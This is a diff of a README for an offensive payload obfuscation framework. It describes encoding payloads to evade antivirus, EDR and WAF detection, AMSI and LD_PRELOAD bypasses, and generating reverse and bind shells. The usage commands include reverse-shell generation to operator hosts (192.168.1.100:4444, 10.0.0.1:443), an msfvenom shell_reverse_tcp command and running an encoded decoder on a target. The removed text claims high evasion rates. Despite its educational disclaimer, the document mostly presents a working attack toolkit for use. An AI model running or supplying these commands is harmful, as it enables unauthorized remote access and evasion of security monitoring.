@@ -1,193 +1,195 @@
-# Advanced Payload Encoder & Obfuscation Framework
+# Advanced Payload Obfuscation Framework
 
-**Purpose:** Educational red team evasion techniques demonstration
+A payload encoding and obfuscation framework for educational purposes and authorized penetration testing.
 
-## 🎯 Overview
+## Features
 
-Professional-grade payload obfuscation framework with 7 evasion layers that chain together to bypass AV/EDR/WAF detection systems. Built for educational purposes and red team research.
+- **5 Encoding Algorithms**: Base64, XOR, ROT13, Caesar Cipher, Polymorphic
+- **Multiple Input Formats**: Binary files, hex strings, C# arrays, raw data
+- **Payload Generation**: Linux/Windows reverse/bind shells
+- **Automatic Decoders**: Generated Python decoders with execution capability
+- **OS-Specific Bypasses**: AMSI (Windows) and LD_PRELOAD (Linux)
 
-## 🔧 Features
+## Installation
 
-### 7-Layer Evasion Chain
-1. **Unicode Cloak** - Zero-width spaces break pattern matching
-2. **Base64 Armor** - Multi-layer encoding with padding manipulation  
-3. **XOR Encryption** - Repeating key encryption
-4. **Junk Scatter** - Random character insertion (40% density)
-5. **Fragmentation** - Split payloads with reassembly
-6. **OS Bypass** - AMSI (Windows) + LD_PRELOAD (Linux)
+```bash
+git clone <repository-url>
+cd advanced_payload_framework
+chmod +x setup.sh
+./setup.sh
+```
 
-### Detection Engine Testing
-- **AV Engines:** Windows Defender, ClamAV, Kaspersky
-- **EDR Systems:** Memory execution, API hooking detection
-- **WAF Bypass:** Web application firewall evasion
+## Quick Start
 
-## 📁 Project Structure
+### Prepare Your Payloads
+First, place your payload files in the `sample_payloads/` directory:
+```bash
+# Example: Create a simple command payload
+echo "whoami && id" > sample_payloads/my_payload.txt
+
+# Or copy your existing payload
+cp your_payload.bin sample_payloads/
+```
+
+### Interactive Menu
+```bash
+./start.sh
+```
+
+### Command Line Usage
+
+#### Basic Framework
+```bash
+# Simple obfuscation
+python3 main.py --file sample_payloads/basic.txt --chain stealth --variants 3
+
+# OS-specific with bypasses
+python3 main.py --file sample_payloads/basic.txt --chain full --target linux --variants 5
+```
+
+#### Payload Generator
+```bash
+# Generate reverse shell
+python3 payload_gen.py -t python_reverse --host 192.168.1.100 -p 4444 -o shell.py -f python
+
+# Generate Linux shellcode
+python3 payload_gen.py -t linux_reverse --host 10.0.0.1 -p 443 -o shell.bin
+```
+
+#### Advanced Encoder
+```bash
+# XOR encoding with decoder
+python3 encoder.py -i payload.bin -o encoded.txt -e xor --key 0xAA --decoder
+
+# Base64 encoding
+python3 encoder.py -i shellcode.hex -f hex -e base64 --iterations 3 -o encoded.txt
+
+# Polymorphic encoding
+python3 encoder.py -i payload.bin -e polymorphic -o encoded.txt --decoder
+```
+
+## File Structure
 
 ```
 advanced_payload_framework/
-├── main.py              # CLI master control
-├── encoders/           
-│   ├── base64.py        # Base64 armor encoding
-│   ├── xor.py           # XOR encryption
-│   └── rot13.py         # Character rotation
-├── obfuscators/
-│   ├── unicode.py       # Zero-width space insertion
-│   ├── junk_scatter.py  # Random character injection
-│   └── fragment.py      # Payload fragmentation
-├── bypasses/
-│   ├── amsi_windows.py  # Windows AMSI bypass
-│   └── ld_preload_linux.py # Linux library injection
-├── utils.py            # Utility functions
-├── reporter.py         # Executive reports
-├── sample_payloads/    # Test payloads
-│   └── basic.txt       # Contains "whoami"
-├── setup.sh           # Installation script
-├── LICENSE            # MIT License
-├── .gitignore         # Git ignore rules
-└── README.md          # This file
+├── main.py                 # Main obfuscation framework
+├── start.sh               # Interactive menu
+├── encoder.py             # Advanced payload encoder
+├── payload_gen.py         # Payload generator
+├── decoder.py             # Payload decoder utility
+├── encoders/              # Encoding modules
+├── obfuscators/           # Obfuscation modules  
+├── bypasses/              # OS bypass modules
+├── sample_payloads/       # Test payloads (PUT YOUR PAYLOADS HERE)
+├── libhook.so            # Compiled hook library
+├── test_framework.py     # Unit tests
+└── demo_pipeline.sh      # Demo workflow
 ```
 
-## 🚀 Quick Setup
+## Usage Examples
 
-### Prerequisites
-- Python 3.6+
-- GCC compiler (for Linux bypasses)
-- Linux/macOS recommended
-
-### Installation
+### 1. Basic Obfuscation
 ```bash
-# Clone the repository
-git clone <repository-url>
-cd advanced_payload_framework
+# Put your payload in sample_payloads folder first
+echo "whoami" > sample_payloads/test_payload.txt
 
-# Run setup script
-chmod +x setup.sh
-./setup.sh
+# Obfuscate with stealth chain
+python3 main.py --file sample_payloads/test_payload.txt --chain stealth --variants 3
 
-# Verify installation
-python3 main.py --help
+# Save result
+python3 main.py --file sample_payloads/test_payload.txt --chain stealth --variants 1 > obfuscated.txt
 ```
 
-## 💻 Usage
-
-### Basic Commands
+### 2. Generate and Encode Shellcode
 ```bash
-# Process payload from file
-python3 main.py --file sample_payloads/basic.txt --chain basic --variants 3
+# Generate Python reverse shell
+python3 payload_gen.py -t python_reverse --host 192.168.1.100 -p 4444 -o shell.py -f python
 
-# Direct payload input
-python3 main.py --payload "whoami" --chain stealth --variants 5
+# Encode with XOR
+python3 encoder.py -i shell.py -e xor --key "secret" -o encoded_shell.txt --decoder
 
-# Full obfuscation chain
-python3 main.py --file sample_payloads/basic.txt --chain full --variants 10
-
-# Target-specific obfuscation
-python3 main.py --payload "whoami" --target windows --variants 5
+# Execute decoder (on target)
+python3 encoded_shell_decoder.py
 ```
 
-### Advanced Usage
+### 3. Metasploit Integration
 ```bash
-# Generate comprehensive variants
-python3 main.py --payload "whoami" --chain full --variants 20
+# Generate msfvenom payload
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f csharp > msf_payload.cs
 
-# Save results to JSON
-python3 main.py --file sample_payloads/basic.txt --chain stealth --output results.json
-
-# Test against detection engines
-python3 main.py --payload "whoami" --chain stealth --test
+# Encode with framework
+python3 encoder.py -i msf_payload.cs -f csharp -e polymorphic -o encoded.txt --decoder
 ```
 
-### Command Line Options
-- `--payload` - Direct payload string to obfuscate
-- `--file` - Path to payload file (e.g., sample_payloads/basic.txt)
-- `--chain` - Obfuscation chain: basic/stealth/full (default: stealth)
-- `--target` - Target OS: windows/linux/both (default: both)
-- `--variants` - Number of variants to generate (default: 5)
-- `--test` - Test against detection engines
+### 4. OS-Specific Bypasses
+```bash
+# Linux with LD_PRELOAD bypass
+python3 main.py --file sample_payloads/basic.txt --chain full --target linux
+
+# Windows with AMSI bypass  
+python3 main.py --file sample_payloads/basic.txt --chain full --target windows
+```
+
+## Command Reference
+
+### main.py Options
+- `--file` - Input payload file
+- `--payload` - Direct payload string
+- `--chain` - Obfuscation chain: basic/stealth/full
+- `--target` - Target OS: windows/linux/both
+- `--variants` - Number of variants to generate
+- `--verbose` - Show detailed processing steps
 - `--output` - Save results to JSON file
 
-## 🔬 Technical Deep Dive
+### encoder.py Options
+- `-i, --input` - Input payload file
+- `-o, --output` - Output encoded file
+- `-e, --encoder` - Encoding algorithm: base64/xor/rot13/polymorphic/caesar
+- `-f, --format` - Input format: raw/hex/csharp/binary
+- `--key` - Encoding key (for XOR)
+- `--decoder` - Generate decoder stub
+- `--output-format` - Output format: hex/csharp/python/base64
 
-### Layer 1: Unicode Obfuscation
-```python
-# Inserts zero-width spaces to break signatures
-payload = "whoami"
-obfuscated = "w\u200bh\u200bo\u200ba\u200bm\u200bi"
+### payload_gen.py Options
+- `-t, --type` - Payload type: linux_reverse/linux_bind/windows_reverse/windows_bind/python_reverse/python_bind
+- `--host` - LHOST for reverse shells
+- `-p, --port` - Port number
+- `-o, --output` - Output filename
+- `-f, --format` - Output format: binary/hex/csharp/python
+
+## Testing
+
+```bash
+# Run unit tests
+python3 test_framework.py
+
+# Run demo pipeline
+bash demo_pipeline.sh
+
+# Test decoder
+python3 decoder.py encoded_payload.txt
 ```
 
-### Layer 2: Base64 Armor
-```python
-# Multi-iteration base64 with custom padding
-original = "whoami"
-encoded = base64.b64encode(base64.b64encode(original.encode())).decode()
-```
+## Legal Disclaimer
 
-### Layer 3: XOR Encryption
-```python
-# Repeating key XOR with latin1 encoding
-key = "cyber"
-xored = bytes([b ^ key[i % len(key)] for i, b in enumerate(payload)])
-```
-
-## 🛡️ Detection Evasion Techniques
-
-### Signature Bypass
-- String fragmentation
-- Character substitution
-- Encoding chains
-- Pattern breaking
-
-### Behavioral Evasion
-- Execution delay
-- Context awareness
-- Environment checks
-- Anti-analysis
-
-### Heuristic Bypass
-- Randomization
-- Polymorphic generation
-- Decoy insertion
-- Statistical normalization
-
-## 📈 Performance Metrics
-
-### Evasion Rates (Average)
-- **Basic Chain:** 70-80% evasion
-- **Stealth Chain:** 85-92% evasion  
-- **Full Chain:** 90-98% evasion
-
-### Supported Payloads
-- Windows PowerShell commands
-- Linux bash/shell commands
-- Web application attacks (XSS, SQLi)
-- Container escape techniques
-- APT-style living-off-the-land
-
-## ⚠️ Legal Disclaimer
-
-This framework is developed for:
+This framework is for:
 - **Educational purposes only**
 - **Authorized penetration testing**
-- **Red team exercises with permission**
-- **Cybersecurity research**
+- **Security research with permission**
 
 **NOT for:**
 - Unauthorized system access
 - Malicious activities
 - Illegal penetration testing
-- Production malware development
 
-## 🤝 Contributing
+## Contributing
 
-Contributions are welcome! Suggestions for improvement:
+1. Fork the repository
+2. Create your feature branch
+3. Make your changes
+4. Test your changes
+5. Submit a pull request
 
-1. Additional obfuscation layers
-2. New detection engine signatures
-3. Enhanced reporting features
-4. Performance optimizations
+## License
 
----
-
-**Framework Version:** 1.0  
-**Last Updated:** 2024  
-**License:** MIT
+MIT License - see LICENSE file for details.
